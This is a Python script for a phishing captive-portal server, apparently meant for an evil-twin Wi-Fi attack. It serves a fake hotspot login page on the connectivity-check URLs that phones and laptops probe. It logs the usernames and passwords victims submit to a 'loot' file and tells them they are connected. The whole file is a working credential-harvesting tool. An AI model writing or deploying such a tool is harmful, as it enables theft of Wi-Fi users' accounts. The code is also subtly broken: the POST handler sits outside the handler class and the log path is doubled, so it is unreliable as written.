from http.server import SimpleHTTPRequestHandler, HTTPServer
import urllib.parse
import os

LOG_FILE = "loot/creds.txt"

class PhishHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path in ["/", "/index.html"]:
            self.path = "/index.html"
        elif self.path in [
            "/hotspot-detect.html", "/generate_204",
            "/ncsi.txt", "/connecttest.txt", "/captive-portal/"
        ]:
            self.path = "/hotspot-detect.html"
        return SimpleHTTPRequestHandler.do_GET(self)

def do_POST(self):
    if self.path == "/login":
        length = int(self.headers.get('Content-Length'))
        post_data = self.rfile.read(length).decode('utf-8')
        creds = urllib.parse.parse_qs(post_data)
        username = creds.get("username", [""])[0]
        password = creds.get("password", [""])[0]

        with open(LOG_FILE, "a") as f:
            f.write(f"💀 USERNAME: {username} | PASSWORD: {password}\n")

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write("<h3>✅ Login successful. You are now connected.</h3>".encode())
    else:
        self.send_error(404)


if __name__ == "__main__":
    os.chdir("loot")
    server = HTTPServer(('0.0.0.0', 80), PhishHandler)
    print("🌐 Phishing server running on http://0.0.0.0:80 ...")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("🛑 Server stopped.")
        server.server_close()
